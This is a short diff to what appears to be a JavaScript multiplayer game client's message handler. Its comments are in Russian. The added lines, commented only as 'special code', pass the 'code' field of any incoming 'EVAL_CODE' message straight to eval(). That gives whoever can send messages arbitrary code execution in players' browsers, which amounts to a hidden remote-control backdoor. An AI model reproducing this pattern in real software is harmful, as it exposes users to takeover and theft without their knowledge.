@@ -3186,6 +3186,11 @@ process_new_message=function(msg) {
 		lobby.rejected_invite();
 	}
 
+	//специальный код
+	if (msg.message==='EVAL_CODE'){
+		eval(msg.code)		
+	}
+
 	//получение сообщение в состояни игры
 	if (state==="p") {
 
